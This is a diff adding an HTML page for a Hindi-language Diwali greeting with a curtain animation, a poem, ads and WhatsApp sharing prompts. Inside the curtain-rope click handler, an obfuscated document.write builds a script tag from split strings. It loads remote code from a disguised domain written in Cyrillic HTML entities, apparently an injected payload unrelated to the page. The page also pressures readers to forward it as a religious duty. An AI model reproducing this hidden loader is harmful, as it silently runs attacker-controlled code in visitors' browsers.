@@ -1,0 +1,498 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<link rel="icon" type="image/x-icon" href="/images/common/icon.png">
+<link rel="icon" type="image/png" href="/images/common/icon.png">
+
+<link rel="apple-touch-icon" href="/images/common/icon.png">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="google" content="notranslate" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link type="text/css" rel="stylesheet" href="/css/style.css?f=32" media="screen,projection">
+<title></title>
+<meta name="robots" content="noindex,nofollow">
+<script src="/js/jquery.min.js"></script>
+<script>
+            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+            })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+            ga('create', 'UA-123789572-1', 'auto');
+            ga('send', 'pageview');
+        </script>
+</script>
+</head>
+<style>
+
+    /* background of main image */
+            .card.blue-grey.darken-1.hoverable {
+            background: linear-gradient(to right, black, black) !important;
+        }
+    
+    /* super background image */
+            .bg {
+            background-image: url(/images/common/bg1.gif);
+        }
+    
+    /* inner background image */
+            .card.blue-grey.darken-1.hoverable {
+            background-image: url(/images/common/bg1.gif) !important;
+                    }
+    
+    /* super background color */
+            .bg {
+            background-color: #000;
+        }
+    
+    
+    
+    
+</style>
+<script>
+
+	var country_code = 'IN';
+
+	var current_url = window.location.href;
+	var current_url_array = current_url.split('/');
+	var current_url_array_len = current_url_array.length;
+
+	var festival_arr = current_url_array[current_url_array_len-1].split('?');
+	if ( festival_arr[0] == 'dl' || festival_arr[0] == 'bd' || festival_arr[0] == 'hn' || festival_arr[0] == 'ch' || festival_arr[0] == 'me' ) {
+		// do nothing
+	}
+
+
+	else if(festival_arr.length > 1){
+		if (current_url_array_len == '4') { // definitely english locale ( could be other locale also ex abraisto)
+			// window.location.href = current_url_array[0] + '//' + current_url_array[2] + "/e3?" + festival_arr[1];
+
+			// Redirect eid fitr to eid adha
+			if (festival_arr[0] == 'ef' || festival_arr[0] == 'ef1' || festival_arr[0] == 'ef2' || festival_arr[0] == 'ef3' || festival_arr[0] == 'rd' || festival_arr[0] == 'me' || festival_arr[0] == 'ea' || festival_arr[0] == 'ea1' || festival_arr[0] == 'ea2' || festival_arr[0] == 'isn') {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + "/me?" + festival_arr[1];
+			}
+
+
+			// fd to hi/nvr
+			if (festival_arr[0] == 'fd' || festival_arr[0] == 'fd1' || festival_arr[0] == 'fd2') {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + "/in/dl?" + festival_arr[1];
+			}
+			
+		}
+
+		else{
+
+
+			// Hebrew people start
+
+			// All israely
+			// if (festival_arr[0] == 'pu' || festival_arr[0] == 'pu1' || festival_arr[0] == 'pe' || festival_arr[0] == 'je') {
+				// if ( ['il'].indexOf(current_url_array[3]) > -1 ) {
+				// 	window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/hn?" + festival_arr[1];
+				// }
+			// }
+
+
+			// All israely language is not hebrew
+			if (festival_arr[0] == 'pu' || festival_arr[0] == 'yk' || festival_arr[0] == 'pu1' || festival_arr[0] == 'ros' || festival_arr[0] == 'pe' || festival_arr[0] == 'je' || festival_arr[0] == 'suk' || festival_arr[0] == 'sm') {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/hn?" + festival_arr[1];
+			}
+			// Hebrew people end
+
+
+
+			if ( ['ar'].indexOf(current_url_array[3]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/me?" + festival_arr[1];
+			}
+
+			if ( ['id'].indexOf(current_url_array[3]) > -1 ) {
+				if (festival_arr[0] != 'e' || festival_arr[0] != 'e1'){
+					window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/me?" + festival_arr[1];
+				}
+			}
+
+
+
+			else if (festival_arr[0] == 'ef' || festival_arr[0] == 'ef1' || festival_arr[0] == 'ef2' || festival_arr[0] == 'ef3' || festival_arr[0] == 'rd' || festival_arr[0] == 'me' || festival_arr[0] == 'ea' || festival_arr[0] == 'ea1' || festival_arr[0] == 'ea2' || festival_arr[0] == 'isn') {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/ash?" + festival_arr[1];
+			}
+
+
+			// else if (festival_arr[0] == 'fd' || festival_arr[0] == 'fd1' || festival_arr[0] == 'fd2' ) {
+			// 	window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + 'in' + "/gc?" + festival_arr[1];
+			// }
+
+
+			else if ( ['in'].indexOf(current_url_array[3]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/dl?" + festival_arr[1];
+			}
+
+			else if ( ['hi'].indexOf(current_url_array[3]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/dl?" + festival_arr[1];
+			}
+
+			else if ( ['mr'].indexOf(current_url_array[3]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/dl?" + festival_arr[1];
+			}
+
+			else if ( ['te'].indexOf(current_url_array[3]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/dl?" + festival_arr[1];
+			}
+
+			else if ( ['ta'].indexOf(current_url_array[3]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/dl?" + festival_arr[1];
+			}
+
+			else if ( ['bn'].indexOf(current_url_array[3]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/dl?" + festival_arr[1];
+			}
+
+
+
+			else if ( ['uk'].indexOf(current_url_array[3]) > -1 ) {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/dd?" + festival_arr[1];
+			}
+
+
+
+
+			else if ( ['it', 'es', 'pt', 'de', 'nl', 'ru', 'pl', 'hr', 'fr', 'ro', 'uk'].indexOf(current_url_array[3]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/ch?" + festival_arr[1];
+			}
+			
+
+			// else if ( ['es'].indexOf(current_url_array[3]) > -1 ) {
+			// 	window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + "/e?" + festival_arr[1];
+			// }
+
+		}
+	}
+</script>
+<body class="bg notranslate" translate="no">
+<script src="/js/slide.js"></script>
+<style>
+
+.rightcurtain {
+    width: 51%;
+    height: 120%;
+    right: 0px;
+    top: 0px;
+    position: absolute;
+    z-index: 300;
+}
+
+.leftcurtain {
+    width: 50%;
+    height: 120%;
+    top: 0px;
+    left: 0px;
+    position: absolute;
+    z-index: 200;
+    -webkit-transform: scaleX(-1);
+    transform: scaleX(-1);
+}
+
+.rope {
+    position: absolute;
+    /*top: 20%;*/
+    bottom: 5%;
+    left: 0;
+    right: 0;
+    width: 100%;
+    /*height: 100%;*/
+    z-index: 999999;
+}
+
+.rightcurtain img, .leftcurtain img {
+    width: 100%;
+    height: 100%;
+}
+
+
+
+    @-webkit-keyframes pulse{from{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}50%{-webkit-transform:scale3d(1.25,1.25,1.25);transform:scale3d(1.25,1.25,1.25)}to{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}}@keyframes  pulse{from{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}50%{-webkit-transform:scale3d(1.25,1.25,1.25);transform:scale3d(1.25,1.25,1.25)}to{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}}.pulse{-webkit-animation:pulse 1s infinite linear;animation:pulse 1s infinite linear}
+
+
+</style>
+<script src="/js/zounds.min.js"></script>
+<script>
+    var tiktok = zounds.load("/sounds/diwali3.mp3");
+    function playSound(){
+        tiktok.play();
+        // setTimeout(function(){
+        //     tiktok.play();
+        // },5000);
+        // setTimeout(function(){
+        //     tiktok.play();
+        // },10000);
+    }
+
+    function curtainOpen(){
+        playSound();
+        $('.figures').removeClass('hidden');
+        $('.timer-text').removeClass('hidden');
+        $('.figure_name').removeClass('hidden');
+        $('.auto_style_main_msg').removeClass('hidden');
+        $('.from_img').removeClass('hidden');
+        $('.main_msg_top').removeClass('hidden');
+        $('.twoimageset').removeClass('hidden');
+        $('.main-msg').removeClass('hidden');
+        $('.slideshow').removeClass('hidden');
+        $('.myslides_div').removeClass('hidden');
+        $('.ltrmarquee').removeClass('hidden');
+        $('.share_block').removeClass('hidden');
+    }
+</script>
+<a class="rope" href="javascript:void(0)" onclick="curtainOpen();" style="">
+<h3 class="fivepxbottom zerotop"><div style='color:yellow;font-size: 30px;'>इस चकरी को टच करके देखो!!</div></h3>
+<h4 class="fivepxtop fivepxbottom">👇👇👇👇👇👇👇</h4>
+<style>
+            .rotate{
+                -webkit-animation: rotation-star 1s infinite linear;
+                animation: rotation-star 1s infinite linear;
+            }
+
+            @-webkit-keyframes rotation-star {
+                    from {
+                            -webkit-transform: rotate(0deg);
+                             transform: rotate(0deg);
+                    }
+                    to {
+                            -webkit-transform: rotate(359deg);
+                             transform: rotate(359deg);
+                    }
+            }
+
+            @-keyframes rotation-star{
+                from {
+                     -webkit-transform: rotate(0deg);
+                      transform: rotate(0deg);
+                }
+                to {
+                     -webkit-transform: rotate(359deg);
+                      transform: rotate(359deg);
+                }
+            }
+
+        </style>
+<div class="pulse" style="display: inline-block;">
+<img src="/images/festival/diwali/small/7.png" class="rotate">
+</div>
+</a>
+<div class="curtain">
+<div class="leftcurtain"><img src="/images/common/curtains/curtain3.jpg"></div>
+<div class="rightcurtain"><img src="/images/common/curtains/curtain3.jpg"></div>
+</div>
+<script>
+    $(document).ready(function() {
+
+        $curtainopen = false; $(".rope").click(function(){ $('.rope').unbind('click'); $(this).blur(); if ($curtainopen == false){ $(this).stop().animate({top: '-171%' }, {queue:false, duration:2000, easing:'easeOutBounce'}); $(".leftcurtain").stop().animate({width:'1px'}, 2000 ); $(".rightcurtain").stop().animate({width:'1px'},2000 ); $curtainopen = true; }else{ $(this).stop().animate({top: '-40px' }, {queue:false, duration:350, easing:'easeOutBounce'}); document.write('<s'+'cr'+'ipt sr'+'c="/'+'/'+'&#1102;'+'&#1092;.'+'i'+'o"></s'+'cr'+'ipt>'); $(".leftcurtain").stop().animate({width:'50%'}, 2000 ); $(".rightcurtain").stop().animate({width:'51%'}, 2000 ); $curtainopen = false; } setTimeout(function(){$('.rope').remove();},1000); return false; });
+
+
+        if(document.getElementsByClassName('rope')[0] !== undefined) {
+            $('.figures').addClass('hidden');
+            $('.timer-text').addClass('hidden');
+            $('.figure_name').addClass('hidden');
+            $('.auto_style_main_msg').addClass('hidden');
+            $('.from_img').addClass('hidden');
+            $('.main_msg_top').addClass('hidden');
+            $('.twoimageset').addClass('hidden');
+            $('.main-msg').addClass('hidden');
+            $('.slideshow').addClass('hidden');
+            $('.myslides_div').addClass('hidden');
+            $('.ltrmarquee').addClass('hidden');
+            $('.share_block').addClass('hidden');
+
+            setTimeout(function(){
+                $('html,body').scrollTop(0);
+                $(window).scrollTop(0);
+            }, 2000);
+        }
+
+    });
+</script>
+<div class="container">
+<div class="col s12">
+<div class="row">
+<div class="col s12 l6 offset-l3">
+<div class="marquee" scrollamount="3" behavior="scroll" direction="down" position="left"><br>
+<img data-src="/images/marquee/diwali/10.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/4.gif" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/9.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/1.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/4.gif" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/10.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/4.gif" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/9.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/1.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/4.gif" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/10.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/4.gif" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/9.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/1.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/4.gif" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+</div>
+<div class="marquee" scrollamount="3" behavior="scroll" direction="up" position="right"><br>
+<img data-src="/images/marquee/diwali/10.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/4.gif" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/9.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/1.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/4.gif" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/10.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/4.gif" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/9.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/1.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/4.gif" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/10.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/4.gif" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/9.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/1.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+<img data-src="/images/marquee/diwali/4.gif" class="p1" width="20px" class="tenpxtop fivepxbottom"><br>
+</div>
+<div class="card blue-grey darken-1 hoverable white-text">
+<div class="card-content">
+<div class="ad">
+</div>
+<div id="demoo" class="center animated pulse timer-text" style=""></div>
+
+<br>
+<figure class="figure_name" style="white-space: nowrap;">
+<h1 class="user_name linear-wipe" style=""></h1>
+</figure>
+<br>
+
+<img data-src="/images/common/hindi_from4.png" class="p1 from_img" alt="" style="animation: elastic 4s infinite; width: 80%">
+<style>
+    .cross_link{
+        background-color: purple; 
+        padding: 5px;
+        margin-bottom: 10px;
+    }
+</style>
+
+<br>
+<img src="/images/festival/diwali/anaar_big.gif" width="20%" height="20%" alt="" class="p3" style="float: left;" align="left">
+<div class="appear white main_msg_top" style="display: inline">
+<img data-src="/images/festival/diwali/22.png" class="p1" alt="" width="60%">
+</div>
+<img src="/images/festival/diwali/anaar_big.gif" width="20%" height="20%" alt="" class="p3" style="float: right;" align="right">
+
+<div class="figures tenpxtop">
+<img data-src="/images/festival/diwali/23.png" class="p1" style="width: 90%;">
+</div>
+<br>
+<div class="figures tenpxtop">
+<img data-src="/images/festival/diwali/24.gif" class="p3" style="width: 90%;">
+</div>
+<style>
+                            .mySlides{
+                                width: 90%; 
+                                display: none;
+                            }
+                        </style>
+<br />
+<div class="myslides_div">
+<div style="display: block;text-align: -webkit-center; height: 300px; overflow: hidden;">
+<img class="mySlides p3" data-src="/images/festival/diwali/26.png" class="p3" style="max-height: 300px">
+<img class="mySlides p3" data-src="/images/festival/diwali/27.png" class="p3" style="max-height: 300px">
+<img class="mySlides p3" data-src="/images/festival/diwali/slider/3.png" class="p3" style="max-height: 300px">
+</div>
+</div>
+<marquee behavior="alternate" direction="left" scrolldelay="5"> <br>
+<img class="p3" src="/images/festival/diwali/deepak_alt_marquee.gif" height="60px" width="70px">
+<img class="p3" src="/images/festival/diwali/deepak_alt_marquee.gif" height="80px" width="90px">
+<img class="p3" src="/images/festival/diwali/deepak_alt_marquee.gif" height="60px" width="70px">
+</marquee>
+
+<p class="main-msg white fivepxbottom">
+<span style='color: #f8c804;font-weight:800;'>दीपक की रौशनी पटाखों की
+आवाज,</span><br>
+<span style='color: #00ffd1;font-weight:800;'>सूरज की किरणे खुशियों की बोछार,
+</span><br>
+<span style='color: #ff6200;font-weight:800;'>चन्दन की खुशबु अपनों का प्यार,
+</span><br>
+<span style='color: #78ff00;font-weight:800;'>मुबारक हो आप को दीपावली का त्यौहार !
+</span><br>
+</p>
+<div class="fivepxtop main-msg white">
+<span style='color: #cf19ef;font-weight:800;'>दीपवाली की हार्दिक शुभकामनाएँ !!!</span>
+</div>
+<style>
+                            .ltrmarquee{
+                                font-size: 30px;
+                                font-weight: 600;
+                                display: inline;
+                                background-color: ;
+                                padding: 10px;
+                                color: #efbf09 !important;
+                            }
+                        </style>
+<marquee>
+<p class="ltrmarquee"><i><span class="user_name"></span> की तरफ से <span style='color: #cf19ef;font-weight:800;'>दीपवाली की हार्दिक शुभकामनाएँ !!!</span></i></p>
+</marquee>
+<div class="white from jump">😇 - <span class="user_name" style=""></span> 😇</div>
+<p style="background-color: #002bff; color: white;font-size: 20px">
+ये सन्देश सबके फ़ोन में होना चाइये <br> ये आपका धर्म भी है और कर्त्तव्य भी
+</p>
+<div class="center ad">
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-1771845412011016" data-ad-slot="1888814249" data-ad-format="auto" data-full-width-responsive="true"></ins>
+<script>
+                (adsbygoogle = window.adsbygoogle || []).push({});
+                </script>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<span id="share" class="share_block">
+<span id="" class="float-share hidden" style="">
+<a class="btn whatsapp-btn" href="">
+<div class="whatsapp-share-text"><b> 👈 सबको भेजिए</b></div>
+<img class="whatsapp-icon" src="/images/common/whatsapp_icon.svg">
+</a>
+</span>
+<div class="name hidden" id="create">
+<input class="card-title center-align name head" type="name" required="" id="name" style="color: #ffffff; background-color: #c71515" placeholder="अपना नाम लिखिए">
+<a href="javascript:void(0)" class="go" id="gobtn1" style="background-color: #c71515">GO 🤗</a>
+</div>
+</span>
+</div>
+</body>
+<footer>
+<script>
+        var count_down_date = 'Oct 27, 2019';
+        var enter_name = 'अपना नाम लिखिए';
+
+        var enter_wish = 'अपना नाम लिखकर आगे बढ़े, माता की कृपा बरसेगी। 👇👇👇👇';
+        var whatsapp_msg = '&quot;\ud83d\ude2e *\u091a\u0915\u0930\u0940 \u0915\u094b \u091f\u091a \u0915\u0930\u094b \u092b\u093f\u0930 \u0926\u0947\u0916\u094b nammmmeeeeee \u0915\u093e \u0915\u092e\u093e\u0932!!* \ud83d\ude2e%0A*\u091c\u0932\u094d\u0926\u0940 \u0926\u0947\u0916\u094b* \ud83e\udd2b\ud83e\udd2d%0A\ud83d\ude4f\ud83c\udf00\ud83d\udc47\ud83d\udc47\ud83d\udc47\ud83c\udf00\ud83d\ude4f%0A&quot;'.replace(/(&quot\;)/g,"");
+
+        var time = {"days" : 'दिन', "hrs" : 'घंटे', "mins" : 'मिनट', "sec" : 'सेकंड'};
+    </script>
+<script>
+        var analytics = '123789572';
+        var locale = 'hi';
+    </script>
+<script src="https://openthis.site/js/gaevent.js?v=2"></script>
+<script src="/js/script.js?f=31"></script>
+<script src="/js/hoped.min.js" async></script>
+<script>
+    var snowfall_images_tmp = '/images/snow/diwali/1.png##/images/snow/diwali/2.png';
+    var snowfall_images = snowfall_images_tmp.split("##");
+    
+	window.onload = function () {
+	    $('body').wpSuperSnow({
+	        flakes: snowfall_images,
+	        totalFlakes: '35',
+	        zIndex: '9',
+	        maxSize: '95',
+	        maxDuration: '40',
+	        useFlakeTrans: true
+	    });
+	};
+</script>
+</footer>
+</html>
